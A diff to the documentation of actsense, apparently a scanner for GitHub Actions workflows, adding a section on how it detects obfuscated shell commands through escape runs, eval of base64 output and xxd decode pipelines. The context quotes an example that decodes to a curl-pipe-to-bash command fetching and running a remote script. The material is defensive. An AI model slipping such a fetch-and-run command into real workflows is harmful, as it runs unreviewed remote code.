@@ -22,6 +22,10 @@ jobs:
           # Decodes to: curl https://example.com/script.sh | bash
 ```
 
+## How actsense detects this
+
+actsense looks for runs of encoded characters (four or more consecutive `\xNN` or octal escapes), `eval` of base64-decoded output, nested command substitution, `xxd -r` decode pipelines, and parameter expansion over user input. Single escapes, such as terminal colour codes like `printf '\033[31m'`, and ordinary Bash array expansion like `"${files[*]}"` are not reported.
+
 ## Mitigation Strategies
 
 1. **Deobfuscate and review**  
